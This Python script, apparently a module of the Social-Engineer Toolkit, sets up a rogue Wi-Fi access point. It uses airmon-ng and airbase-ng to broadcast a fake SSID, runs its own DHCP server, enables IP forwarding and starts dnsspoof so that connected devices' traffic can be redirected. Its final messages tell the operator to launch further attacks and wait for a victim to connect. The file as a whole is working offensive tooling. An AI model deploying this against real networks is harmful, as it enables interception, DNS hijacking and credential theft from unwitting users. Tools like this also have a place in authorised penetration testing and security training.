#!/usr/bin/env python
# coding=utf-8
##############################################
#
# This is a basic setup for an access point
# attack vector in set.
#
##############################################

import sys
import os
import subprocess
import pexpect
import time
import src.core.setcore as core
from src.core.menu import text

sys.path.append("/etc/setoolkit")
from set_config import AIRBASE_NG_PATH as airbase_path
from set_config import ACCESS_POINT_SSID as access_point
from set_config import AP_CHANNEL as ap_channel
from set_config import DNSSPOOF_PATH as dnsspoof_path
sys.path.append(core.definepath)

try: input = raw_input
except NameError: pass

if not os.path.isfile("/etc/init.d/isc-dhcp-server"):
    core.print_warning("isc-dhcp-server does not appear to be installed.")
    core.print_warning("apt-get install isc-dhcp-server to install it. Things may fail now.")

if not os.path.isfile(dnsspoof_path):
    if os.path.isfile("/usr/sbin/dnsspoof"):
        dnsspoof_path = "/usr/sbin/dnsspoof"
    else:
        core.print_warning("DNSSpoof was not found. Please install or correct path in set_config. Exiting....")
        core.exit_set()

if not os.path.isfile(airbase_path):
    airbase_path = "src/wireless/airbase-ng"
    core.print_info("using SET's local airbase-ng binary")

core.print_info("For this attack to work properly, we must edit the isc-dhcp-server file to include our wireless interface.")
core.print_info("""This will allow isc-dhcp-server to properly assign IPs. (INTERFACES="at0")""")
print("")
core.print_status("SET will now launch nano to edit the file.")
core.print_status("Press ^X to exit nano and don't forget to save the updated file!")
core.print_warning("If you receive an empty file in nano, please check the path of your isc-dhcp-server file!")
core.return_continue()
subprocess.Popen("nano /etc/dhcp/dhcpd.conf", shell=True).wait()

# DHCP SERVER CONFIG HERE
dhcp_config1 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.100 10.0.0.254;
    option domain-name-servers 8.8.8.8;
    option routers 10.0.0.1;
    option broadcast-address 10.0.0.255;
    default-lease-time 600;
    max-lease-time 7200;
}
""")

dhcp_config2 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 192.168.10.0 netmask 255.255.255.0 {
    range 192.168.10.100 192.168.10.254;
    option domain-name-servers 8.8.8.8;
    option routers 192.168.10.1;
    option broadcast-address 192.168.10.255;
    default-lease-time 600;
    max-lease-time 7200;
}
""")

dhcptun = None
show_fakeap_dhcp_menu = core.create_menu(text.fakeap_dhcp_text, text.fakeap_dhcp_menu)
fakeap_dhcp_menu_choice = input(core.setprompt(["8"], ""))

if fakeap_dhcp_menu_choice != "":
    fakeap_dhcp_menu_choice = core.check_length(fakeap_dhcp_menu_choice, 2)
    # convert it to a string
    fakeap_dhcp_menu_choice = str(fakeap_dhcp_menu_choice)
else:
    fakeap_dhcp_menu_choice = "1"

if fakeap_dhcp_menu_choice == "1":
    # writes the dhcp server out
    core.print_status("Writing the dhcp configuration file to ~/.set")
    with open(os.path.join(core.userconfigpath, "dhcp.conf"), "w") as filewrite:
        filewrite.write(dhcp_config1)
    dhcptun = 1

if fakeap_dhcp_menu_choice == "2":
    # writes the dhcp server out
    core.print_status("Writing the dhcp configuration file to ~/.set")
    with open(os.path.join(core.userconfigpath, "dhcp.conf"), "w") as filewrite:
        filewrite.write(dhcp_config2)
    dhcptun = 2

if fakeap_dhcp_menu_choice == "exit":
    core.exit_set()

interface = input(core.setprompt(["8"], "Enter the wireless network interface (ex. wlan0)"))

# place wifi interface into monitor mode
core.print_status("Placing card in monitor mode via airmon-ng..")

# if we have it already installed then don't use the SET one
if os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "/usr/local/sbin/airmon-ng"
else:
    airmonng_path = "src/wireless/airmon-ng"

monproc = subprocess.Popen("{0} start {1} |"
                           "grep \"monitor mode enabled on\" |"
                           "cut -d\" \" -f5 |"
                           "sed -e \'s/)$//\'".format(airmonng_path, interface),
                           shell=True, stdout=subprocess.PIPE)
moniface = monproc.stdout.read()
monproc.wait()

# execute modprobe tun
subprocess.Popen("modprobe tun", shell=True).wait()

# create a fake access point
core.print_status("Spawning airbase-ng in a separate child thread...")
child = pexpect.spawn('{0} -P -C 20 -e "{1}" -c {2} {3}'.format(airbase_path, access_point, ap_channel, moniface))
core.print_info("Sleeping 15 seconds waiting for airbase-ng to complete...")
time.sleep(15)

# bring the interface up
if dhcptun == 1:
    core.print_status("Bringing up the access point interface...")
    subprocess.Popen("ifconfig at0 up", shell=True).wait()
    subprocess.Popen("ifconfig at0 10.0.0.1 netmask 255.255.255.0", shell=True).wait()
    subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
    subprocess.Popen("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1", shell=True).wait()

if dhcptun == 2:
    core.print_status("Bringing up the access point interface...")
    subprocess.Popen("ifconfig at0 up", shell=True).wait()
    subprocess.Popen("ifconfig at0 192.168.10.1 netmask 255.255.255.0", shell=True).wait()
    subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
    subprocess.Popen("route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1", shell=True).wait()

# starts a dhcp server
core.print_status("Starting the DHCP server on a separate child thread...")
child2 = pexpect.spawn("service isc-dhcp-server start")

# starts ip_forwarding
core.print_status("Starting IP Forwarding...")
child3 = pexpect.spawn("echo 1 > /proc/sys/net/ipv4/ip_forward")

# start dnsspoof
core.print_status("Starting DNSSpoof in a separate child thread...")
child4 = pexpect.spawn("{0} -i at0".format(dnsspoof_path))

core.print_status("SET has finished creating the attack. If you experienced issues please report them.")
core.print_status("Now launch SET attack vectors within the menus and have a victim connect via wireless.")
core.print_status("Be sure to come back to this menu to stop the services once your finished.")
core.return_continue()
